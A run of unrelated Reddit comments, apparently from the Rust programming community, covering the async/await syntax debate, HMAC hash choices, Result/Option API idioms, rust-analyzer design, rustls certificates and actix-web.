I put in my preference in the issue for my vote. I had a thought while writing it that I didn't feel was worth mentioning in there though: isn't the reason it's called `await` and not `wait` because it's in a prefix position? If it was suffix position isn't `wait` more appropriate? If you look at it that way then the syntax most clear to me is prefix keyword `await` with parens for disambiguation (i.e. `await x?` means `await (x?)` - await applies to the whole expression to the right of it) with a trait on T or method on Future that adds a method `wait()` which just calls `await self` like @XX suggested. Then you get clear prefix behavior and a way to chain things without new syntax. Since @withoutboats believes `(await x)?` (i.e. Future of Result) would be the more common case but it's not the default, `x.wait()?` would be preferred way to write it instead of `(await x)?`. I haven't thought about it enough to feel comfortable making an actual proposal though.
Yeah, I disagree. I don't think there's an objective "worth it". Clearly the people doing the discussion would seem to think it's worth it.
Because the top commenter ranted about people being discouraged by lots of discussions, and then at the same time condemned the discussion to uselessness. I don't think community involvement is bikeshedding. Really, we should all stop saying "bikeshedding". It's used everytime something is discussed more than some people want. Ironically, often the people who think it's bikeshedding are very active in the discussions.
No, I very much disagree. You just said "it definitely applies here" without any argument about why that is. "I don't care" is not a reason to call something a bikeshed. I'm also unsure why you think I need schooling on the origin?
Like some others, I've been working on a gameboy emulator. I finally got my first game playable! Take a [look](https://gfycat.com/AliveSolidHornedtoad).
Because /u/sbenitez was nice enough to reupload the CS140E course material to his own [website](https://cs140e.sergio.bz), I've decided to continue working on it. Let's see if I can finish assignment 2 this evening.
Seems really cool, I'll definitely give a look :) I've a repo for [my `gfx-hal` examples](https://github.com/gobanos/gfx-hal-examples), in which I've followed [Lunarg vulkan tutorial](https://vulkan.lunarg.com/doc/sdk/1.0.57.0/windows/tutorial/html/index.html), and I wish I could be a part of an initiative like yours :) Is there a way to get involved ?
Unless I misunderstand you, wouldn't direct access to the network card require a jump in to kernel space, and hence also require elevated privs? 
Not having used Flask-* or Diesel, but have you looked at [Diesel-Migrate](https://docs.rs/diesel_migrations/1.4.0/diesel_migrations/index.html)? Maybe the key aspect for you lies in program-based migration verse sql-based migration?
This is awesome! Thank you so much for your work!
This is really interesting, thanks for sharing. I have two questions: - You briefly show in the video how you invalidate analysis results (and cancel pending results) on update and do the analysis again. Do you do any incremental updates that avoid invalidating the _whole_ analysis and only invalidate the parts that would actually be invalid after the change? E.g. if I change something in `f2`, another function `f1` which previously type checked would still type check (assume it doesn't refer to `f2` directly or transitively), and type analysis of it would not change. Do you currently handle this? I'm wondering if "incremental computation" abstractions could be used for this purpose (see e.g. [Adapton](http://adapton.org/)). - You also briefly show how you handle incomplete programs by having lots of `Option`s in the syntax tree, but do you manually implement that syntax tree + the parser for it, or is there an existing library/tool that given the full syntax gives you a parser + types for partial inputs? I'm guessing that manually implementing a parser like this would be a lot of work. Also, how do you handle ambiguities in incomplete programs?
Oh, thanks! That works perfectly! But now, I wonder why (1) causes a warning (private trait in public interface) but (2) does not even though they seem not only functionally but also logically identical: // (1): warns pub trait Sealed: Key {} trait Key {} // (2): does not warn pub trait Sealed: Key {} use private::Key; mod private { pub trait Key {} } It seems like the linter is tricked by the `pub` in front of `Key`. Is your solution guaranteed to not break in the future? Aren't we still leaking a private trait?
&gt; In the example folder you can find an interactive example. Nb: that link is broken.
Actix has worked great for my work and being built on an actor framework is mostly an implementation detail. It isn't perfect but it is good enough to get real work done.
Not affiliated, but they have their own parser. You can check it out here: https://github.com/rust-analyzer/rust-analyzer/tree/master/crates/ra_syntax/src
When an algorithm like SHA-1 suffers a catastrophic breakage, it's best to simply move on. Here's how I put it after the SHAttered attack: https://twitter.com/bascule/status/834814837863575552 This is probably the dozenth time I've had someone ask "But it's still secure with HMAC, right? So why is that bad?" Before it was in the context of HMAC-MD-5. Let me break it down this way: - Is it insecure? No. - Is it a best practice? Also no. Constructions based on algorithms with known breakages, regardless of if a particular usage pattern happens to be secure, are best avoided. They should probably change their default to HMAC-SHA-256. I can't tell if you edited your post retroactively to add this bit: &gt; A longer hash is suboptimal for what this is used for (signed urls / cookies). But regardless, you can always truncate the tag produced by HMAC-SHA-256 if you would like a shorter length, but not a cryptographic primitive with a known weakness. Back to your original question: &gt; So why bring it up? I brought it up as one of many warning signs about this particular project. What can I say: these warning signs are how I evaluate cryptographic libraries. This project was originally brought up in the context of high-quality libraries which are missing from the Rust ecosystem, and compared to my project. As I tried to illustrate in my post: the comparison isn't apt because this *project is misusing cryptographic terminology* leading to confusion, but also using obsolete algorithms by default.
Exactly the kind of answer I was looking for, thanks a lot!!!
&gt; I'm looking for volunteers to develop the criterion-plot subcrate into a first-class plot-rendering crate Does that mean it should move away from gnuplot?
get_foo() tho
Yus, you are right.
On the other hand, if you say A and your interlocutor insists that technically that means B, despite knowing very well that A was meant, then your interlocutor is not worth debating. 
1) yes, invalidation is fine grained. Salsa was inspired in part by adapton, though it uses simpler (pull based) invalidation strategy. Independent functions already are typechecked independently (though there’s no test for this). Though, for type-checking specifically, laziness is more important than incrementality(see https://github.com/rust-lang/rfcs/pull/1317#issuecomment-150965895 for confirmation of this claim in another setting) 2) parser is hand written, yeah(see the grammar dir in the repository). Writing a single parser is not too hard, it’s much harder to get the infrastructure for writing parsers in place. I have not seen a single generated parser that does good error recovery, although atom’s tree-sitter comes close. Implementing error recovery in a hand written parser is really simple and boils down to two tricks. See https://matklad.github.io/2018/06/06/modern-parser-generator.html for details, starting with “It boils down to two simple tricks.” :)
I think rather, the big debate _(based on skimming the thread over the past few days)_ is whether we want good support for chaining or not. There's several UXs being kept in mind, and the syntaxes you outlined impact scenarios pretty differently. As an easy example: ``` let foo = await getFoo(); ``` Is difficult to chain.
`Result&lt;Option&lt;T&gt;, Error&gt;` is more idiomatic. Using the standard types (preferably also shying away from `OptionLike`) lets the user make use of all the support built into the standard library, and partly to the language. Case in point: The propagation operator `?` works with both `Result` and `Option`.
In addition to bikeshedding involving importance, I this case I think we have an issue where depending on the use case, we are totally painting it Puke-Orange. I'm not knocking any of the options specifically, but if you look at some of the examples on how it would look while used in chaining, it definitely looks like Puke-Orange. Why I view this as not bikeshedding is because imo what is being discussed is not what color to paint the shed, but knowing we likely *have* to paint some parts Puke-Orange, what parts will that be? The syntax we choose, based on what seems available, will cause some styles of code writing to feel like it is Puke-Orange. It will not be pretty, friendly, readable. This is the compromise, unfortunately. We *(they)* are trying to choose the options with the least negative impact - the least Puke-Orange.
Typically you would try to mirror what is actually valid in the protocol. For example, it sounds like you're talking about HTTP. In HTTP, you have a status code and some content, regardless of whether it is a success or a failure, so maybe: struct HttpResponse { status_code: StatusCode, content: Content, } (oversimplifying a bit, but w/e) Now, if you have a function which should always return a HTTP response, you have it return that. If you have a function which *might* return a HTTP response, or might fail entirely, then you could use `Result&lt;HttpResponse, Error&gt;` Maybe a layer further up the HTTP stack will turn those `Error` cases into a 500 HttpResponse. Finally, this HttpResponse type is not super easy to use, so maybe you will add some helper methods to construct and manage these respones, eg. `HttpResponse::success("Hello, world!")`
&gt; Rather than debating the merit of the await thread, we are discussing the definition of bike-shedding. I disagree, we're discussing the merit of the thread by discussing *if it is bike shedding or not*. It was clear that two users have differing opinions of the bike shedding definition, so how can they agree/disagree on whether or not the thread is bike shedding if they can't even agree on a common definition? Using common language should be meaningful in any discussion.
`OptionLike` was a poor example to indicate cases where I need to convey more information than just Some or None. An example being, `Some, None, Skip` in a record reading application. `SomeNoneSkip` is fine for `OptionLike`, no? Or is there a better option I might be unaware of? Appreciate the info!
And they could be wrong. Facts aren't subjective.
Julia isn't interpreted, at least not by default. It's actually much closer to an AOT-compiled language than, say, Java, in that (again, by default) functions are *guaranteed to be* compiled to native code the first time they are called with given argument types. 
`OptionLike` is as good an example as anything. What I was trying to get at was the multiple advantages of using the idiomatic structs: * The API is more self-documenting; People already know `Result` and `Option` * Users know what your return values mean just by reading the function signature * Users know how to work with your return values, both with a whole bunch of combinators and the propagation operator While the last point is _possible_ to combat by implementing all the same APIs (*), the first two are simply the advantages of using the idiomatic approach. Also, don't worry too much about creating verbose types. A sensible sprinkle of type aliases (`type Result&lt;T&gt; = Result&lt;T, MyError&gt;`) can help, but I have seldomly come across type names that are hard to read. (*) Except for the propagation operator. Support for working with this is in the works, but not released, as far as I know.
I disagree that it's a fact.
Thanks. Glad I could help. :)
Good point about idiomatic operators. How far does that apply I wonder? Ie, in my `SomeNoneSkip` example, I suppose it could be written two different ways: ``` Result&lt;SomeNoneSkip&lt;T&gt;, Error&gt; // vs Result&lt;Option&lt;SomeSkip&lt;T&gt;&gt;, Error&gt; ``` Where in the 2nd example `None` now is now conveyed via the idiomatic `Option`, and `Skip` is inside the Option. Thoughts on which of those is considered better? I imagine it's largely a stylistic approach, but I'm trying to develop predictable idiomatic code. The first example is a bit more sane in my view, but the 2nd example uses your point of the signature being itself more predictable. People will see `Result&lt;Option` and know how to at least that much of the function. I fear the 2nd example is too much nesting though, and any costs saved by using `Option` are lost by the degree of nesting types.
-.-'' I knew I forget to check something. Thanks for letting me know, I'll update this with `v0.4.1` and on github right now.
Then your opinions on the matter are subjective and warrant no more concern to me than my own. If the value produced by our collective efforts are not demonstrable facts, then there's no reason to work together at all.
Yeah, I'm not following anymore. Are you saying there's never a reason to discuss subjective topics, and trying to find something that will annoy the least amount of people should never be done?
I hope this post is all a lead up to using rustls...
&gt; While we have the tendency to attribute growth to individuals, they are actually not as important True, but every individual _is_ pretty important. Graydon was the face of Rust, so I was worried that Rust was going to "lose its way" if it didn't get solid leadership in the pivotal transition to 1.0. Steve has also been highly interactive with the community, and I think it's not unfair to say that a significant part of its growth is highly coupled with his work with the community. Documentation was merely a part of the work he did. But yes, a healthy team is resilient to the "bus factor", and it seems that Rust's team is quite healthy. I'm sad to see him go, and while I know that Rust will keep on going, I imagine his involvement will taper a bit, which _will_ affect the Rust community. However, as you said, I think the Rust community will be fine, I'm just a little sad to see such an iconic member leave the team under less-than-ideal circumstances.
No, I'm saying that the impact of the difference is not so significant as to warrant the amount of attention it receives. We can debate whether or not that's true, but it is pointless to debate whether it is based in fact at all. If it were not a fact, one could warrant genocide in service of syntax, which is absurd. Experience suggests that people over-value what they understand far more than they value the complex things they don't. That's why bike-shedding is a problem: people aren't being honest about what factors actually impact their ability to achieve their goals.
I certainly didn't mean to "school" anyone so I'm sorry if I come across that way. My point was that (IN MY OPINION) it's not about calling something a "bikeshed", i.e. saying something is unimportant, but it's about calling a situation a "bikeshed situation", i.e. saying that because something is easy to understand and develop an opinion about it generates a super high volume of discussion that is perhaps hindering those working on the feature more than it's helping.
He actually started with rustls but started looking into alternatives since it seemingly didn't support X509 client certificate authentication without using PKI: https://ayende.com/blog/185730-A/using-tls-with-rust-part-ii-client-authentication
Yeah, it's difficult to say! I stand by my generic advice above, but now we're getting closer to the nitty gritty of the real world. So now I will have to defer to your descision. I can't remember which library it was, but I have worked with a library that changed its API from basically your first example to your second example. Again, when you're used to Rust, `Result` and `Option` are pretty transparent.
It's just that the background of the term is not really important if it's having a negative effect. It's just another situation where I read the whole thing as "people should stop caring" and I wish we would rid ourselves of that again at some point. It probably would've been better if the original comment didn't use the word "trivial".
Yeah, I have no idea how we got to dishonesty or genocide. I'm bowing out here before I'm rate limited because of all the downvotes.
&gt; They can't be easily exploited today (for HMAC), because we only know of one (set of) collisions for SHA1, and computing more is still prohibitively expensive. None of the attacks of SHA1 even apply to the use of it in itsdangerous, even less so when combined with HMAC. &gt; Using a prefix of SHA256 is more secure because it is harder to break for the same length of hash. (ie. SHA1 is not weak because the output is short, it is weak because of the algorithm). Last time I had the conversation with someone I trust on this topic it was strongly suggested to me that it's not known if truncated SHA-256 is any better than SHA-1 when combined with HMAC.
&gt; They should probably change their default to HMAC-SHA-256. They is me and we changed the default to sha-256 recently and had to revert because it caused a ton of breakage for everybody.
Unrelated, but... &gt; `$ cargo install-code` Since when does `cargo` support custom commands like these?
That happened through a very standard rhetorical device with which you are probably very familiar. 
Oh my... &gt; I’m assuming that this is because rustls is actually verifying the certificate against PKI, which is not something that I want. I don’t like to use PKI for this, instead, I want to register the allowed certificates thumbprints, but first I need to figure out how to make rustls accept any kind of client certificate. I think what he probably wants, rather than shutting off certificate verification, is to use a self-signed certificate and add that to the remote side's truststore as a trusted root certificate. That should hopefully work. I'll also note there's some ongoing IETF work to simplify these kinds of use cases: https://datatracker.ietf.org/doc/draft-wang-tls-raw-public-key-with-ibc/
Not since 1.0, but for a rather long time. You might be interested in https://matklad.github.io/2018/01/03/make-your-own-make.html as well.
People will start new projects in C++98 if that is the compiler their employer supports. Legacy systems are legacy systems, after all. Nothing crazy about it unless you're assuming unlimited budget &amp; manpower.
Ops, I'm sorry, that is not intended.
Yeah, I found the `.cargo/config` file which cleared things up :-). Thanks for working on `rust-analyzer`. I don't think I can contribute much, but I can try testing at least. I'm not sure if they're supposed to, but the completions don't seem to work for me.
I do wish there were more structure to these conversations. As it is, it's very difficult to write a good comment. One has to introduce their own evaluation criteria, and then discuss all the ideas presented so far and maybe some of their own. This needs to be done concisely, but still fairly, in order to have a chance at progressing toward consensus. This is really hard to do. Most people of course aren't doing it. The end result is a hodgepodge of brainstorming, semijustified feelings, and no sign of consensus on the horizon. We should really do something about this. Here is a proposal: We should break the discussion apart into stages. Start with a brainstorm to fish out all the easy ideas. No critiques or comparisons allowed, except to briefly motivate new ideas. This can be done in an issues thread like we do now. An on-going, all-inclusive, unopinionated, dumb/simple summary should be maintained by the team to avoid duplicate suggestions. After say 2 weeks (or as the brainstorming settles), close the brainstorming and move into an evaluation round. The team summarizes the suggestions so far, now making an effort to organize and abstract the contention points (eg prefix vs postfix, keyword vs macro, etc), and perhaps to say a few words on implementability or other deep-compiler-knowledge-needed facts. No opinions. At this point, community members wishing to contribute are to write blog posts where they define their own evaluation criteria and then evaluate the summarized suggestions so far. These evaluations should be exhaustive of all ideas mentioned in the summary. They're free to make their own additional suggestions too, of course. These are posted to the GitHub issue with a brief abstract summarizing the evaluation criteria and conclusion. People may post brief (*brief*) responses to these in the GitHub thread, or rebut with their own blog post. After sufficient time (at least 7 days, typically however long it takes to make the following feasible), the rust team writes their own post that merges the insights gleaned from the various posts so far. This summary conveys the entirety of the team's current opinion. It begins with a summary of the discussion so far. Then the team presents its evaluation criteria (naturally based on prior posts), their current intended solution, and a brief discussion on why it was selected over its competitors. Most of the justification is likely to have appeared in previous blog posts, and it suffices to just summarize and cite them. Assuming that goes well, we essentially enter a final comments period. Or perhaps there is still some indecision. But it should come down to a clear and concrete question, to be answered with a poll, comment/GitHub discussion, or maybe even another round of blogging. Adding structure like this of course introduces a lot of friction to those wishing to be heard after the initial brainstorm. But it should be understood that this is entirely the point. It's like the programming maxim of preferring readability over writability. The current discussions are like spaghetti code, unwieldy masses of low- to medium-effort posts. Forcing high-effort posts streamlines the discussion to focus on ideas that can be rigorously supported. It makes the discussion something that can be followed by people with other things to do. Inevitably there will be out-of-band discussion on Reddit or IRC or wherever anyway, and popular arguments (even bad ones) will find their way into the discussion somehow. By adding a structure like this to the overall conversation, we ensure progress toward consensus.
By all means go for AUv2 ... at some point I went back to AUv2 myself but the basic projects had lots of build errors (with the current tools) I didn't feel like plowing through. AFA command line tools and openFrameworks, You may be underestimating the complexity of the situation, at least for AUv3. You have 3 targets, capabilities, plists, access privileges betwen targets, and poor documentation to deal with. Having said that, I have no familiarity with openFramewoks. I do have 25+ years as a professional programmer (some of that Mac-oriented), however. I have written a ton of supporting Objective-C and C++ code (wavetable osc, IIR filtering, envelope generators, circular buffers, CoreMIDI), so if you want to discuss some sort of sharing of code/ideas I'm very much interested.
It's not about not caring. It's about choosing what to care about and how to express it. For example, I care about await syntax, but I'm not participating in the discussion because I care about the process, the team members leading that process and I trust the process to get most things right most of the time. Moreover, I also understand that I have little to nothing to add to the discussion (as do most others commenting on the issue).
Simple completion like local variables and paths should work. If it doesn’t work for you, could you open the issue with steps to reproduce?
They should use something else, something more appropriate for web development.
Yeah, I would agree. But that's just your approach. Most of the time the term "bikeshedding" comes up it feels like it's a codeword for "people care too much about this". More so when coupled with the (paraphrased) "people will get over it" sentiment in the original comment. I wouldn't even have commented, but I found the use of it at odds with the original comment's hope that this won't discourage people.
I didn't comment on what "bikeshedding" means for a reason. This entire thread about it is a giant waste of time. The OP clarified what they meant. Everything after that is a giant semantic quibble.
That I agree with.
1. Avoids using an obsolete, broken crypto primitive. Attacks only get worse, etc. It may seem unlikely to effect HMAC constructions, but if something does turn up the first thing people will ask is why you didn't migrate off it sooner since the "Walk to Exit" sign's been lit for years. 2. `HMAC-SHA256-160` sounds *way* cooler than `HMAC-SHA1`. Balancing a migration against other needs is fine, but needing something shorter doesn't tie you to older hash functions.
yeah, i was playing on c/++ header files, seems like it was misunderstood or people don't like humor, or maybe the joke is just bad.
Wow. Where do you find the time for so many concurrent projects?
That blog post is great! What are you planning to use floating bar for?
How does this differ from arrayvec‘s ArrayString?
I made a server/API with actix-web a little while ago; if you've never worked with something that implements an actor model it definitely helps to go through the main actix library documentation/tutorial to see what it's doing. If you have the extra time it's actually really interesting, I hadn't been exposed to the idea of an actor model and found it to be pretty ingenious. People are right when they say it's not very well documented though; once you get past the very basic setup, you'll mostly be figuring things out by connecting dots and looking at the source in the cargo generated documentation (thank the good lord for cargo doc). &amp;#x200B; My only real complaint (so I guess word of warning) is that futures/async as they are right now are pretty brutal to work with. If you're not already a veteran futures user, the amount of work it takes to implement a non-trivial route handler is going to be way out of sync with how quickly your brain wants to be able to add stuff. &amp;#x200B; &amp;#x200B;
You should be able to `rustup toolchain add nightly-2019-01-19` (RLS was last broken on 2019-01-19, which means the failure should only appear as of nightly-2019-01-20). See https://rust-lang-nursery.github.io/rust-toolstate/
For internationalization, I have been building the [`gettext-macros`](https://github.com/Plume-org/gettext-macros) and [`rocket_i18n`](https://github.com/Plume-org/rocket_i18n) crates (this last one also support Actix-Web despite the name). They are used in a Rocket application with around 500 translated strings and work quite well so far…
The API is more complete, it never panicks in release (it shouldnt in debug either but there are debug_asserts to make sure it's sound) (allows for truncation), supports diesel, in my oppinion abstracts better the generics (althought it increases the compile time). I will bench against it when I can.
Working on the side-project I've been wanting to work on, &lt;https://cargofox.io&gt;! It is a set of tools for doing various analytics on crates, and a website for presenting the data and results. The goal is to find crates that heavily need maintenance/review or contain suspicious code, in an attempt to make it easier to find and spot attacks like the recent `event-stream` exploit in the Javascript world. Along the way I intend to dig for lots of other interesting tidbits. All those people who complain "dependency trees for modern programs are too big and complex to fully evaluate, doing it for even one large program would take forever"? They're wrong, we just don't have the right tools to do it efficiently. So, I want to make the right tools. It is *very* early days yet, but the initial "spike" experiment has been finished: it fetches crates and metadata, unzips crates, runs an analysis program to collect features, and outputs results. The analysis program is just `tokei` so far, but it's a start!
Yet the risks for SHA1 are better understood than the risks of truncated SHA-256
Wrong link? You've linked to the `error-chain` page. I think you wanted to link to https://crates.io/crates/coercible_errors.
It was just *too real* :D
Question about Futures: Given the following type alias: ``` /// Type definition for convenience. pub type BoxFuture&lt;T, E&gt; = Box&lt;Future&lt;Item = T, Error = E&gt; + Send&gt;; ``` How come I can return a `BoxFuture&lt;(), Error&gt;` from a function but if i do `impl Future&lt;Item=(), Error=Error&gt;` then i get and error stating the following: ``` the trait `futures::Future` is not implemented for `()` ``` I thought the two ways of returning futures were interchangeable
Still, keep an eye on Rocket, since next version (0.5) will be compiling on stable, plus other exciting stuff like async. https://rocket.rs/v0.4/news/2018-12-08-version-0.4/
Actix is much simpler than rocket though. Writing an API with it is not any more diffiuclt than with Rocket.
&gt; It seems like the linter is tricked by the pub in front of `Key` Yes, yes it is. It's not very smart and this idiom is established now. There is an early rule ([Rust RFC 136](https://github.com/rust-lang/rfcs/blob/master/text/0136-no-privates-in-public.md)) against some kinds of visibility mixing, but it was intended to be gradually refined. For example abstract return types (`-&gt; impl Trait` in a fn declaration) allow functions to have a more-private return type hidden behind a sufficiently public trait bound. However, that refinement is based on type theory and the experience of functional languages like Haskell. (`type F = fn() -&gt; impl Trait;` means "there exists a type `Return` such that `type F = fn() -&gt; Return` and `Return: Trait`". The compiler understands an unsolved type variable floating around, but that variable must be solved to a concrete type when the program is compiled. Since solving type dependencies was already Turing complete, that's an acceptable level of difficulty.) - &gt; Is your solution guaranteed not to break in the future? Yes. The promise is that it will not break without an edition change (and you can link crates from different editions together). It may, however, generate a warning. https://blog.rust-lang.org/2014/10/30/Stability.html &gt; To put it simply, our responsibility is to ensure that you never dread upgrading Rust. If your code compiles on Rust stable 1.0, it should compile with Rust stable 1.x with a minimum of hassle. - &gt; Aren't we still leaking a private trait? I guess that depends on what you mean by "leaking". Users can infer the existence of the private trait (and it should be documented anyway) but they can't write code that would break if that private trait were changed. Modularity in Rust isn't defined by obfuscation or reverse-engineering resistance. It's mostly about looking at a crate or module and being able to prove that a change to it won't cause a compilation failure outside that module. 
You don't even have to know what actors are to use actix web though.
The Rust type system knows about thread safety so it's normal practice to not give detailed thread-safety notes in the documentation whenever the type system communicates the constraints correctly. (A similar rule applies to ownership / double-free.) The rule is if it builds you shouldn't have data races or similar violations, otherwise the library is wrong. That's especially helpful with Diesel, since the crate contains macros which create types and those types don't necessarily have documentation pages. But when concrete types are documented, you can see what the constraints are. For example, [`diesel::mysql::MysqlConnection`](https://docs.rs/diesel/1.4.0/diesel/mysql/struct.MysqlConnection.html) is `Send !Sync`. You can't access the connection value simultaneously from multiple threads (`!Sync`), but you can put it inside a `Mutex` to allow multiple threads to each take their turn accessing it (`Send`). You can expect that plain data without interior mutability is `Sync` and `Send`. Values with interior mutability or handles to external resources might not be able to implement those traits. 
Agree, it feels like `try!`, where eventually people will get sick of typing `await` and prefer `@` similar to `?`.
(CC: /u/CryZe92) I've filed an issue [here](https://github.com/paulocsanz/arraystring/issues/1) so that the discussion can be concentrated in one place. :)
I published my acme certificate library https://crates.io/crates/acme-lib
Indeed. Thanks, I fixed it.
Thanks for pointing out the "!Sync" - I've completely missed it while checking docs.
So why not send PRs to arrayvec ?
The upfront productivity costs of getting something working on Rust are, in my experience, way beyond the maintenance costs you end up paying in languages that are less pedantic about getting it right the first time. I've made a substantial amount of money over the years spending hours digging through Python based web apps finding nascent bugs that caused erroneous behavior by mixing mostly-compatible but not-always types like paths, strings, urls, etc. Way more hours than it would have taken to write these apps in Rust in the first place and then not have emergent dynamic bugs from a loose type or consistency (like C++) system.
I wouldn't worry. Seems like people are mostly arguing about postix and prefix, each sticking to their own personal style of coding. Persoanlly, I would like to have both (100%) happines, then my preference is postfix (90% happines) and if prefix is going to be selected it's OK too (85% happiness). I don't see any of this being **that** important. And we can actually change it (either by adding the other version, or deprecating one that figured out actually sucks, later). BTW. I do JS at dayjob, and it seems to me intuitively that `await` (especially in JS) should be just implicit. It is just noise. There's absolutely nothing else that you can do, so every `await` is just an annotation "yes, compiler/interpreter", I know that this is a potential yield point. 
This is a much needed tool for the Rust community (really, every package manager should have something like this). I'd love to see a permissioning system work its way into the language. Something like "This library would like to access the &lt;network, disk, environment variables&gt;. Is that okay?"
It's not so much the layout, as the side-effects of the change, that worry me. I don't *care* how `std::vector&lt;bool&gt;` stores its booleans... right until the moment I write `bool&amp; bibi = vec.at(42);` and the compiler barfs at me. `T&amp; bibi = vec.at(42);` works for every `std::vector&lt;T&gt;`... except `std::vector&lt;bool&gt;`. As mentioned, and more subtle, are also changes of run-time behavior. For example... what if `Vec&lt;(T, U, V)&gt;` is specialized at `(Vec&lt;T&gt;, Vec&lt;U&gt;, Vec&lt;V&gt;)`: AOS vs SOA, it's better right? But then, suddenly, the cache access patterns are completely different, which may be a blessing or a curse. Those are the issues I really dread: - change of interface. - change of performance profile.
You don't have to touch actors in any way with actix-web if you don't want to.
I always miss use statements in a lot of snippets from crate docs out there. This makes a lot more simple when starting learning a new API.
AWESOME WORK. It should be noted, not only does the ubuntu touch phone app with qt and rust, but also the DESKTOP UBUNTU app with qt/rust work. It deserves more attention from the rust community. I would love to see such a clickable for the latest versions of ubuntu. I would also love to see the mainline Linux kernel running on the nexus 5. I'm surprised it isn't there yet considering it is a google nexus phone and all. Canonical should reconsider reviving/supporting all this stuff along with jumping onto the rust/qt bandwagon. There is something to this.
&gt; (1) Do you expect this to include the latter parts of the original Pi trilogy, that is, defining runtime value-level types [...]. No, I doubt they're manageable within 3 years, even if they were found desirable. For formal verification, I would favor the Ada/SPARK approach of annotations as demonstrated by [Prusti](http://www.pm.inf.ethz.ch/research/prusti.html). The main benefit, for me, is that similarly to Gradual Typing, it's there for people who need/want it, but doesn't get in the way of those who don't. &gt; (2) Will this (either intentionally or as a mean-to-an-end) include variable parameter generics? Those are known as *variadics*, for reference. Variadics are independent from const generics, and could in theory be implemented in parallel; in practice, doing one after the other may avoid conflicts and let the community stabilize its idioms before pulling another drastic change. It's unclear to me how *deep* variadics would need to go. Unlike C++, Rust has built-in tuples, so it seems that a lot of "variadic" functionality could be exposed with only a few primitives on tuples: - Pack/Unpack: Transform a parameter pack into a tuple, or unpack a tuple into a parameter pack. - Split/Join: Split a tuple in two, or join two tuples in one. With only those 4 primitives, you could probably do quite a lot! C++ has a lot more, but the resulting code can get very, VERY, complex to read and debug. It's also a compile time hog. So, it's unclear how far into variadics Rust should dive. A little bit, to get rid of the silliness of trait implementations for tuples, would be welcome. Once that's covered, it's unclear if more is necessary.
Sometimes it can make sense to create custom wrappers, but IMO only either for crate-internal use (not pub) or for really large / important libraries. An alternative not mentioned so far is to encode the various "not Some(_)" states in the error. Note: this may or may not make sense, depending on the concrete use case and how the types are used. ```rust enum WrapperError { Skip, None, Error(Error), } fn f() -&gt; Result&lt;T, WrapperError&gt; {...} ```
And beyond language features, there's also quite a bit of experimentation on how to structure middlewares...
Heck yes! This is awesome!
You are going to have atleast some exposure if you want to use a database. I was playing a lot with the regular non-web actix as well though so it all kind of blends together for me. Glancing at the docs it looks a bit different than I remember.
I have ambitious goals for [piet](https://github.com/linebender/piet) this week. First is to get [druid](https://github.com/xi-editor/druid) working with piet-based drawing, to break its Windows-only dependency. Second is to get it to the point where it can function as an [resvg back-end](https://github.com/RazrFalcon/resvg/blob/master/docs/backend_requirements.md) - probably not implementing every single check-box, but having a story.
Saying somithing is 10 years out and saying something is overtaken in 10 years are two different things, though.
That's odd; rustls has great support for doing custom certificate verification in either direction.
The real problem is that the operating system is the only program that can do this robustly, and operating systems mostly allow stuff by default. If we ACTUALLY want security we need to have OS's that deny everything by default, and program permissions need to be all whitelisted. The problem is that actually doing this well, and making computers still be useful afterwards, is a huge sink of time and effort. Technology: easy. Intersection of technology and humans: hard. As it is, I'm still not sure how I'm going to have Cargofox even try to investigate this. Probably build a crate in a VM on an isolated network and have `iptables` or such logging what network requests it tries to make. Either that or run it inside `strace` or a debugger and actually read the syscalls it makes, though sophisticated malware can still detect that and do innocent things if it realizes its being monitored.
&gt; We never use stale data to answer requests. Under the cover, `AnalysisHost` "remembers" all outstanding `Analysis` instances. The `AnalysisHost::apply_change` method cancels all `Analysis`es, blocks until all of them are `Drop`ped and then applies changes in-place. This triggers my CLion-freeze spidey sense, so I'd like to make sure I understand correctly. Let's take a relatively large codebase. A couple thousands of files. Then: 1. User edits `option.rs` and adds `T: Debug` constraint to `Option::unwrap`. 2. User continues `Option::unwrap`, and press TAB to aucomplete `prin|`. Does the library blocks until it's reprocessed all uses of `Option::unwrap` in the codebase, and checked whether the `T: Debug` constraint is satisfied in every case? Or does it autocomplete `prin|` with `println!(|)` immediately? In CLion, this manifests as the IDE refusing to lists the available methods of the type because it's reindexing after a pull, when 99% of the time the type in question didn't change anyway... and now you're stuck waiting for indexing... which on a large C++ codebases takes a couple minutes. As a user, I would rather have slightly out-of-date solution as a best-effort, than *nothing*. Honestly, I'd be fine with just a little marker "From previous indexing..." or something like that.
I would definitely go for `Result&lt;SomeNoneSkip&lt;T&gt;, Error&gt;` over `Result&lt;Option&lt;SomeSkip&lt;T&gt;&gt;, Error&gt;` (although I'm not sure I entirely understand what semantics "skip" conveys, which might make a difference. I wouldn't be put off defining your own types. One of the great things about Rust is that it has a lot flexibility in this area than most languages (e.g. much more powerful enums). But just keep the standard lib types in mind, and use them when the semantics do fit.
You're looking for r/playrust.
I have no idea! I just made it because I like making stuff that's interesting and "different". Altho I do want to try it in the future to see what its best uses are; it can have better precision (!) than floating point, but has a lower range of values, and I want to explore when those properties would be useful in which scenarios. Relatedly, I'm really into reversible computing (which requires no information be lost, so no floating-point), and floating-bar seems like a great way of representing partial/fractional numbers in such a paradigm. But even if I don't end up using it for anything I hope other people find it useful, or at least have fun playing around with it :)
yes it is an assignment
I agree it makes sense and concede that you will probably use actors for a non-trivial site. You don't have to , though. It's just tokio, so you can also use something like tokio-postgres or use your own thread pool instead of actors.
I'm rewriting the scheduler of [Inko](https://inko-lang.org/)'s VM, which is written in Rust. The current M:N scheduler uses quite a bit of locking, and its work-stealing implementation is subpar. Unfortunately, writing a good M:N scheduler takes a lot of time. This is further complicated by the need for being able to pin tasks to certain threads (e.g. when interacting with foreign code that uses thread-local storage). With that said, I'm slowly making progress. I have been considering writing a bit more about this in the form of some kind of dev log, but I'm not sure if people would be interested in it.
I don't work. I'm a student
I actually don't know if I agree with your assessment. However, for Rust I think you're probably right -- it needs to be done at a language level. A very limited language might say "the absolute only way to access the network stack is through this part of the standard library". If you can do that in a structured and secure way, you cannot use the network stack unless the standard library (which hooks into the language) allows you to. You need to have artificial and secure bottlenecks. If you can implement it purely at the package level, bets tend to be off and you have to rely on heuristics. Similarly, Haskell (normally) has this kind of security. Rather than just doing things with side effects, it needs to declare a monad and then that monad must be run with an executor. It's like futures with something like tokio. You can declare what you're going to do, but you can't do it unless you put it in a threadpool/futures executor. In that way, you might say futures are capabilities secure with regards to pre-emption.
What VsCode theme is this? I like how it looks with rust. &amp;#x200B; Awesome guide btw, thanks for putting it up!
This was a super interesting read. I've always wanted to do something with gRPC or Protobuf 
